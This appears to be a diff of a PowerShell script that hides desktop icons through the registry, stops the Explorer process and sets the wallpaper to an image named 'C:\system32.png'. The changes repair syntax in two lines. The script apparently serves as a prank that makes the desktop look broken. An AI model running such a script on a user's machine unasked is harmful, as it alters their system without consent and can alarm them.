@@ -1,6 +1,6 @@
   Function Set-WallPaper($Image) {
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value "10"  -Force 
-  Add-Type -TypeDefinition @" ")); 
+  Add-Type -TypeDefinition @"
   using System; 
   using System.Runtime.InteropServices;
   public class Params 
@@ -18,5 +18,5 @@
   }
   $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\" 
   Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1 
-  Get-Process "explorer" | Stop-Process "));
+  Get-Process "explorer" | Stop-Process
   Set-WallPaper -Image "C:\system32.png"
